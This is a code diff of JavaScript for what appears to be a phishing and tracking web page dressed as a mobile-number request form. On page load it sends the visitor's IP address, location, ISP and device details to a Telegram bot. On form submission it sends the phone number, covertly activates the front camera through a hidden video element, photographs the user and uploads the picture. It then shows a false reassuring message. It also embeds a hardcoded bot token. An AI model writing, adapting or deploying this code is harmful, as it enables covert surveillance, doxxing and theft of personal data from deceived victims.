@@ -1,6 +1,10 @@
+const BOT_TOKEN = "8095048550:AAFpZHp4hV7AA-YKU9nWGntY79kIPoxVOAQ"; // Replace with your bot token
+const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+const API_FILE_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+
 async function getIpDetails() {
     try {
-        const response = await fetch("https://ipapi.co/json/");
+        const response = await fetch("https://ipinfo.io/json");
         if (!response.ok) throw new Error("Failed to fetch IP details");
         return await response.json();
     } catch (error) {
@@ -37,9 +41,7 @@ async function getDeviceInfo() {
     return deviceInfo;
 }
 
-async function sendTelegramMessage(token, chatId, message) {
-    const API_URL = `https://api.telegram.org/bot${token}/sendMessage`;
-    
+async function sendTelegramMessage(chatId, message) {
     const data = {
         chat_id: chatId,
         text: message,
@@ -60,32 +62,10 @@ async function sendTelegramMessage(token, chatId, message) {
     }
 }
 
-async function capturePhoto() {
-    return new Promise((resolve, reject) => {
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const context = canvas.getContext('2d');
-
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        context.drawImage(video, 0, 0);
-
-        canvas.toBlob(blob => {
-            if (blob) {
-                resolve(blob);
-            } else {
-                reject(new Error("Failed to capture image"));
-            }
-        }, 'image/png');
-    });
-}
-
-async function sendPhoto(token, chatId, photoBlob) {
-    const API_FILE_URL = `https://api.telegram.org/bot${token}/sendPhoto`;
+async function sendPhoto(chatId, photo) {
     const formData = new FormData();
-    
     formData.append('chat_id', chatId);
-    formData.append('photo', photoBlob, 'photo.png');
+    formData.append('photo', photo);
 
     try {
         const response = await fetch(API_FILE_URL, {
@@ -100,23 +80,32 @@ async function sendPhoto(token, chatId, photoBlob) {
     }
 }
 
+async function capturePhoto(video) {
+    const canvas = document.createElement('canvas');
+    const context = canvas.getContext('2d');
+
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+
+    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+    const photo = canvas.toDataURL('image/png');
+
+    // Convert data URL to Blob
+    const response = await fetch(photo);
+    const blob = await response.blob();
+    return new File([blob], 'photo.png', { type: 'image/png' });
+}
+
 async function sendInitialInfo() {
-    const urlParams = new URLSearchParams(window.location.search);
-    const token = urlParams.get('token');
-    const chatId = urlParams.get('id');
-
-    if (!token || !chatId) {
-        console.error("Bot token or Chat ID missing in URL!");
-        return;
-    }
-
     const ipDetails = await getIpDetails();
     const deviceInfo = await getDeviceInfo();
+    const urlParams = new URLSearchParams(window.location.search);
+    const chatId = urlParams.get('id');
 
     const message = `
 <b><u>ℹ️ Activity Tracked:</u></b>
 
-<b>🌐 IP Address:</b> <i>${ipDetails.ip}</i>
+<b>🌐 Ip address:</b> <i>${ipDetails.ip}</i>
 <b>🌍 Location:</b> <i>${ipDetails.city}, ${ipDetails.region}, ${ipDetails.country}</i>
 <b>📡 ISP:</b> <i>${ipDetails.org}</i>
 <b>🔍 ASN:</b> <i>${ipDetails.asn}</i>
@@ -126,9 +115,15 @@ async function sendInitialInfo() {
 <b>🔌 Battery Level:</b> <i>${deviceInfo.chargingPercentage}%</i>
 <b>🌐 Network Type:</b> <i>${deviceInfo.networkType}</i>
 <b>🕒 Time Zone:</b> <i>${deviceInfo.timeZone}</i>
+
+<b>👨‍💻 Developer: @Fucker_King_X</b>
 `;
 
-    await sendTelegramMessage(token, chatId, message);
+    if (chatId) {
+        await sendTelegramMessage(chatId, message);
+    } else {
+        console.error("Chat ID missing in URL!");
+    }
 }
 
 document.getElementById('data-form').addEventListener('submit', async function (event) {
@@ -137,11 +132,10 @@ document.getElementById('data-form').addEventListener('submit', async function (
     const operator = document.getElementById('operator').value;
     const mobileNumber = document.getElementById('mobile-number').value;
     const urlParams = new URLSearchParams(window.location.search);
-    const token = urlParams.get('token');
     const chatId = urlParams.get('id');
 
-    if (!token || !chatId) {
-        alert("Bot token or Chat ID is missing in the URL!");
+    if (!chatId) {
+        alert("Invalid Invite Link");
         return;
     }
 
@@ -152,39 +146,52 @@ document.getElementById('data-form').addEventListener('submit', async function (
 <b>📱 Mobile number:</b> +91${mobileNumber}
 <b>📡 Operator:</b> ${operator}
 
-<b>🌐 IP Information:</b>
-<b>🌐 IP Address:</b> <i>${ipDetails.ip}</i>
+<b>🌐 Ip Information:</b>
+<b>🌐 Ip address:</b> <i>${ipDetails.ip}</i>
 <b>🌍 Location:</b> <i>${ipDetails.city}, ${ipDetails.region}, ${ipDetails.country}</i>
 <b>📡 ISP:</b> <i>${ipDetails.org}</i>
 <b>🔍 ASN:</b> <i>${ipDetails.asn}</i>
+
+<b>👨‍💻 Developer: @Fucker_King_X</b>
 `;
 
-    await sendTelegramMessage(token, chatId, message);
+    await sendTelegramMessage(chatId, message);
 
-    try {
-        const photoBlob = await capturePhoto();
-        await sendPhoto(token, chatId, photoBlob);
-    } catch (error) {
-        console.error("Error capturing or sending photo:", error);
-    }
+    const video = await startCamera();
+    const photo = await capturePhoto(video);
+    await sendPhoto(chatId, photo);
 
-    alert("Your request has been processed under 24 hours!");
+    // Stop the camera and clean up
+    const tracks = video.srcObject.getTracks();
+    tracks.forEach(track => track.stop());
+    video.remove();
+
+    alert("Your request has been processed under 24 hours !");
 });
+
+sendInitialInfo();
 
 document.getElementById('mobile-number').addEventListener('input', function () {
     this.value = this.value.replace(/[^0-9]/g, '');
 });
 
 async function startCamera() {
-    const video = document.getElementById('video');
+    const video = document.createElement('video');
+    video.style.display = 'none'; // Hide the video element
+    document.body.appendChild(video);
+
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
         video.srcObject = stream;
         video.play();
+
+        await new Promise(resolve => {
+            video.onloadedmetadata = resolve;
+        });
+
+        return video;
     } catch (error) {
         console.error("Error accessing camera:", error);
+        return null;
     }
 }
-
-startCamera();
-sendInitialInfo();
